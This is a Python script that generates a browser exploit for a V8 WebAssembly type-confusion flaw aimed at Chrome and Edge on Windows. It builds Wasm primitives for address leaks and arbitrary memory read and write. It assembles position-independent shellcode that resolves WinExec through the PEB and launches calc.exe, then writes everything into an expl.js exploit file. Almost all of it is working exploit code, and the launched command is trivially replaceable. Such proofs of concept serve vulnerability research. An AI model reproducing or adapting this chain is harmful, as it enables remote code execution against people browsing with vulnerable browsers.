from wasmwriter import *
from pwn import *

typeNone = Label("typeNone",1000012) # 1000013 for upstream v8, 1000012 for current chrome/edge

types = [funcType([tAnyRef],[tI64])]    # type 0: function addrOf
types +=[structType([(tI64,True)])]     # type 1: i64*
types += [structType([(ref(1),True)])]  # type 2: i64**
types += [structType([(ref(2),True)])]  # type 3: i64***
types += [funcType([tI64],[tI64])]      # type 4: function arbRead(addr i64) -> val i64
types += [funcType([tI64,tI64],[])]     # type 5: function arbWrite(addr i64, val i64)
types += [RecursiveGroup([structType([])]*(1000000-len(types)))]+100*[structType([(tAnyRef,True)])] # types 10^6..10^6+100: exploit struct (any*)
secTP = TypeSection(types)

secFun = FunctionSection([0,4,5])

codeAddrOf = Expression((localGet(0), # obj
                         structNew(typeNone),    #obj* / None   
                         castRef(1),            #i64*
                         structGet(1,0)))       #i64
codeRead64SBX = Expression((localGet(0),        #addr
                            constI64(8),
                            i64Sub,
                            structNew(1),       #&addr
                            structNew(typeNone), #&&addr
                            castRef(3),         #i64***
                            structGet(3,0),     #i64**
                            structGet(2,0),     #i64*
                            structGet(1,0)))    #i64
codeWrite64SBX = Expression((localGet(0),       #addr
                            constI64(8),
                            i64Sub,
                            structNew(1),      #&addr
                            structNew(typeNone),#&&addr
                            castRef(3),        #i64***
                            structGet(3,0),    #i64**
                            structGet(2,0),    #i64*
                            localGet(1),       #i64*,i64
                            structSet(1,0)))

#sc_consts = [(i%7)*0x1111111111111111 for i in range(1,20)]
#codeSc = (localGet(0),)
#codeSc += tuple(constU64(i) for i in sc_consts)
#codeSc += len(sc_consts)*(i64Add,)
                             
secCode = CodeSection([Code(codeAddrOf), Code(codeRead64SBX), Code(codeWrite64SBX)])
secExp = ExportSection([FuncExport("addrOf",0),FuncExport("read64SBX",1),FuncExport("write64SBX",2)])#, FuncExport("shell",3)])
mod = WasmModule([secTP,secFun,secExp,secCode])

context.arch = "amd64"
context.os = "windows"

save_regs = ["rbx","rcx","rdx","rbp","rsi","rdi"]
for i in range(8,16):
    save_regs.append(f"r{i}")
push_regs = "\n".join(f"push {i}" for i in save_regs)
pop_regs = "\n".join(f"pop {i}" for i in save_regs[::-1])    
ASM = f"""
{push_regs}
xor ebx, ebx
test rsp, 8
jnz unaligned 
inc ebx
push rbx
unaligned:
push rbx


    xor esi, esi
mov rbx, qword ptr gs:[rsi+0x60]
    mov rbx, [rbx + 0x18] /* PEB->Ldr */
    mov rsi, [rbx + 0x20] /* PEB->Ldr.InMemOrder LIST_ENTRY */
    lodsq
    xchg rax, rsi
    lodsq
    mov rbx, [rax + 0x20] /* LDR_DATA_TABLE_ENTRY->DllBase */ /* rbx = kernel32.dll PE base */
    mov r8d, [rbx + 0x3c]
    mov rdx, r8
    add rdx, rbx
    xor r9d, r9d
    mov r9b, 0x88
    add rdx, r9
    mov r8d, [rdx]
    add r8, rbx /* r8 = export table */
    mov esi, [r8 + 0x20]
    add rsi, rbx /* rsi = names table */
    xor rcx, rcx
    mov r9, 0x41636f7250746547

    /* Loop through the names table */
FindFunction:
    inc rcx
    mov eax, [rsi + rcx * 4]
    add rax, rbx
    cmp qword ptr [rax], r9
    jnz FindFunction

    mov esi, [r8 + 0x24]
    add rsi, rbx /* rsi = ordinals table */
    mov cx, [rsi + rcx * 2]
    mov esi, [r8 + 0x1c]
    add rsi, rbx /* rsi = address table */
    mov eax, [rsi + rcx * 4]
    add rax, rbx /* rax = function address */
    mov rdi, rax
    /* push b'WinExec\x00' */
    mov rax, 0x636578456e6957
    push rax
    mov rdx, rsp
    xor esi, esi
mov rcx, qword ptr gs:[rsi+0x60]
    mov rcx, [rcx + 0x18] /* PEB->Ldr */
    mov rsi, [rcx + 0x20] /* PEB->Ldr.InMemOrder LIST_ENTRY */
    lodsq
    xchg rax, rsi
    lodsq
    mov rcx, [rax + 0x20] /* LDR_DATA_TABLE_ENTRY->DllBase */
    sub rsp, 0x30
    call rdi
    add rsp, 0x38
    mov rsi, rax

	
    lea rcx, [rip + command]
    mov edx, 3
    sub rsp, 0x60
    call rsi
    add rsp, 0x60

pop rbx
test ebx, ebx
jz out
pop rbx
out:
{pop_regs}
ret

command:
.asciz "calc.exe"

"""
print(ASM)

shellcode = asm(ASM)
shellcode += bytes((-len(shellcode))%8)

out = io.BytesIO()
w=WasmWriter(out)
w.write(mod)
with open("emptymod.wasm","rb") as f:
    emptymod = f.read()
with open("template_expl.js","r") as f:
	template = f.read()
js = template.replace("$WASM2_BYTES$",",".join(map(str,bytes(emptymod))))
js = js.replace("$WASM_BYTES$",",".join(map(str,bytes(out.getbuffer()))))
js = js.replace("$SHELLCODE_BYTES$",",".join(map(str,shellcode)))
js = js.replace("$TYPE_OFFSETS$",",".join(map(str,w.labels["typeNone"])))

print(w.labels)
with open("expl.js","w") as f:
	f.write(js)
